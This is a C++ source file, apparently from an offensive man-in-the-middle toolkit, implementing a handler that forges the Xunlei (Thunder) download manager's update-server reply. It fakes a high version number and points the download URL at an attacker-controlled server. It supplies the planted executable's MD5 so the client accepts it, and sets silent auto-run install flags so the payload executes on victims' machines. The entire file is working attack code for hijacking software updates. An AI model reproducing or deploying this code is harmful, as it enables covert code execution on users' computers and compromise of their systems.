
#include <windows.h>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "Thunder.h"
#include <iostream>
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../ssl/sslPublic.h"

using namespace std;




// GET /plugin?peerid=3FEC19B000009KPQ&os=10.0.0.0.1&pid=1&v=9.1.49.1060&cid=100001&lng=0804&tag= HTTP/1.1
// Host: upgrade.xl9.xunlei.com







Thunder::Thunder(DWORD ulIP, string filepath, string fn) {
	char* lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + G_USERNAME;

	string version = "99.9.9.4360";
	char* retformat =
		"{\"data\":{\"id\":\"31\",\"title\":\"xunlei11\",\"pid\":1,"
		"\"cid\":\"100001,100002,100003,100004,100005,100006,100007,100008,100009,100010,100011,100012,100013,100014,100015,100017,100018,100019,100020,"
		"100021,100022,100023,100024,100025,100026,100027,100028,100029,100030,100032,100033,100034,100035,100036,100037,100038,100044,100045,100050,100051,"
		"100052,100054,100057,100058,100059,100061,100063,100064,100065,100066,100067,100068,100069,100070,100071,100072,100073,100084,100086,100089,100090,"
		"100076,100091,100092,100093,100094,100095,100096,100098,100097,100099,100100,100101,100102,100103,100106,100107,100108,100109,100110\","
		"\"peerid\": \"\","
		"\"cover_version\":\"10.0.1-10.0.3,10.1.1-10.1.18,10.1.21-10.1.37,10.1.38.880,10.1.38.882,10.1.38.884,10.1.38.888,10.1.38.890,11.0.0-11.4.0,"
		"11.4.2-11.4.5,11.4.5-99.4.5,11.4.6.2080,11.4.6.2082\","
		"\"cover_os_version\":\"6.0-12.0\",\"v\":\"%s\",\"t\":2,"
		"\"desc\":\"update\","
		"\"status\":\"1\",\"url\":\"http://%s/%s\","
		"\"size\":%u,\"param\":\"/S /LiveUpdate /AutoRun\",\"md5\":\"%s\","
		"\"lng\":\"0804\",\"retrywait\":0,\"retrytimes\":0,\"name\":\"Ñ¸À×9ÕýÊ½°æ\"},\"content\":\"success\",\"code\":0}";

	string filename = Public::getUserPluginPath(G_USERNAME) + WEIXIN_PC_UPDATE_EXE_FILENAME;
	char szmd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	int exefs = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char result[4096] = { 0 };
	int retlen = sprintf(result, retformat, version.c_str(), ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME, exefs, szmd5);

	int m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	return;
}

